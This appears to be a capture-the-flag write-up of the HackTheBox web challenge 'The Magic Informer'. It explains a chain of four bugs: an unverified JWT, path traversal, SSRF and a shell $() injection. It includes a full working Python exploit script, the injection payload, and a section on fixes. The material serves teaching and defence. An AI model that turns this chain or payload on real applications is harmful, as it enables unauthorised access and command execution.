---
layout: post
title: "The Magic Informer"
date: 2027-08-03 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, jwt, broken-auth, ssrf, path-traversal, command-injection, CWE-347, CWE-22, CWE-918, CWE-78]
---

## Overview

The Magic Informer is an Easy HTB Web challenge that chains four bugs: a [broken JWT verification](https://cwe.mitre.org/data/definitions/347.html) (the app calls `jwt.decode()` instead of `jwt.verify()`), a [path traversal](https://cwe.mitre.org/data/definitions/22.html) to exfiltrate a randomised debug password, a [server-side request forgery](https://cwe.mitre.org/data/definitions/918.html) that pivots to a localhost-only debug endpoint, and a [command injection](https://cwe.mitre.org/data/definitions/78.html) inside a double-quoted sqlite3 CLI call. All four are needed in sequence to read the flag.

---

## The Technique

### Bug 1 — JWT no-verify ([CWE-347](https://cwe.mitre.org/data/definitions/347.html))

Both `AuthMiddleware.js` and `AdminMiddleware.js` authenticate users like this:

```js
import { decode } from "../helpers/JWTHelper.js";

// ...
return decode(req.cookies.session)
    .then(user => {
        req.user = user;
        if (req.user.username !== 'admin') return res.redirect('/dashboard');
        return next();
    });
```

And `JWTHelper.js`:

```js
const decode = async(token) => {
    return (jwt.decode(token));   // decode — not verify
};
```

`jwt.decode()` only base64url-decodes the payload; it never touches the signature. The random `APP_SECRET` is never consulted. Any token whose JSON payload contains `{"username":"admin"}` is accepted as admin, regardless of how it was signed.

### Bug 2 — Path traversal on `/download` ([CWE-22](https://cwe.mitre.org/data/definitions/22.html))

```js
resume = resume.replaceAll('../', '');
return res.download(path.join('/app/uploads', resume));
```

The filter is single-pass. `....//` has `../` at index 2; one replacement removes it and leaves `../`. So `....//debug.env` survives the filter as `../debug.env`, and `path.join('/app/uploads', '../debug.env')` resolves to `/app/debug.env` — which holds the randomised `DEBUG_PASS`.

### Bug 3 — SSRF via `/api/sms/test` ([CWE-918](https://cwe.mitre.org/data/definitions/918.html))

The admin SMS-test endpoint makes a server-side `axios` request to any URL supplied by the caller:

```js
let options = { method: verb.toLowerCase(), url: url, timeout: 5000, headers: parsedHeaders };
if (verb === 'POST') options.data = params;
axios(options)...
```

There is no URL validation. Pointed at `http://127.0.0.1:1337/debug/sql/exec`, the server-originated request satisfies `LocalMiddleware`:

```js
if (req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') return next();
```

A `Cookie` header in the SSRF body passes the forged admin JWT to the inner `AdminMiddleware` as well.

### Bug 4 — Shell `$()` expansion in sqlite3 CLI ([CWE-78](https://cwe.mitre.org/data/definitions/78.html))

The localhost-only debug endpoint:

```js
let safeSql = String(sql).replaceAll(/"/ig, "'");
let cmdStr = `sqlite3 -csv admin.db "${safeSql}"`;
const cmdExec = execSync(cmdStr);
```

Only double-quotes are filtered. Bash `$()` command substitution fires inside double-quoted strings. The payload `SELECT '$(/readflag)'` produces:

```bash
sqlite3 -csv admin.db "SELECT '$(/readflag)'"
```

Bash runs `/readflag` (a SUID binary that executes `cat /root/flag`), substitutes the flag string into the argument, and sqlite3 executes `SELECT 'HTB{...}'`, returning the flag as CSV on stdout.

---

## Solution

The full exploit is a single Python script:

```python
#!/usr/bin/env python3
"""
HTB - The Magic Informer (Web, Easy)
Chain: JWT no-verify -> path traversal -> SSRF -> $() shell injection in sqlite3 CLI
"""
import sys, base64, json, requests

TARGET = sys.argv[1]   # host:port
BASE = f"http://{TARGET}"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# 1. Forge admin JWT — signature never verified
header  = b64url(b'{"alg":"HS256","typ":"JWT"}')
payload = b64url(b'{"username":"admin"}')
ADMIN_JWT = f"{header}.{payload}.{b64url(b'fakesig')}"

s = requests.Session()
s.cookies.set("session", ADMIN_JWT, domain=TARGET.split(':')[0])

# 2. Path traversal: ....// -> ../ after replaceAll('../','')
r = s.get(f"{BASE}/download", params={"resume": "....//debug.env"})
debug_pass = next(l.split('=', 1)[1] for l in r.text.splitlines() if l.startswith('DEBUG_PASS='))

# 3+4. SSRF to localhost debug endpoint; $(/readflag) expands in sqlite3 CLI
ssrf_body = {
    "verb":    "POST",
    "url":     "http://127.0.0.1:1337/debug/sql/exec",
    "params":  json.dumps({"sql": "SELECT '$(/readflag)'", "password": debug_pass}),
    "headers": f"Content-Type: application/json\nCookie: session={ADMIN_JWT}",
    "resp_ok": "ok", "resp_bad": "bad",
}
r = s.post(f"{BASE}/api/sms/test", json=ssrf_body)
inner = json.loads(r.json()['result'])
print(f"FLAG: {inner['output'].strip()}")
```

```bash
python3 solve.py <host>:<port>
# FLAG: HTB{...}
```

---

## Why It Worked

Each bug is a known anti-pattern made concrete:

- **`jwt.decode()` vs `jwt.verify()`** — a single wrong function name silently removes all signature validation. The admin secret is generated correctly (`crypto.randomBytes(69)`) but is never used at verification time.
- **Single-pass `replaceAll('../', '')`** — the `....//` trick works because the replacement is not recursive. Each pass only removes the first embedded `../`; after the filter, `../` is reassembled from the surviving characters. The same bypass appeared in the Orbital challenge.
- **SSRF from a "test webhook" feature** — legitimate-looking admin features that make outbound HTTP requests are a classic SSRF source; here the URL, method, headers, and body are all attacker-controlled.
- **`$()` inside double-quoted shell arguments** — escaping `"` to `'` does not prevent bash command substitution; `$(cmd)` fires unconditionally inside `"…"` strings at the shell level, before the argument ever reaches sqlite3.

---

## Fix / Defense

```js
// 1. JWT: verify, never decode
const user = jwt.verify(req.cookies.session, process.env.APP_SECRET, { algorithms: ['HS256'] });

// 2. Path traversal: basename + prefix check
const safe = path.basename(resume);
if (!safe) return res.status(400).end();
return res.download(path.join('/app/uploads', safe));

// 3. SSRF: allowlist outbound URLs
const allowed = /^https:\/\/platform\.clickatell\.com\//;
if (!allowed.test(url)) return res.status(400).json({ message: 'URL not allowed' });

// 4. Command injection: use the library, not the shell
const db = new Database('/app/admin.db');
const rows = db.prepare(sql).all();
```

The root cause across all four bugs is the same pattern: user-controlled data flowing into a security-sensitive operation without adequate validation. Fixing each individually still leaves the others; all four need to be addressed together.
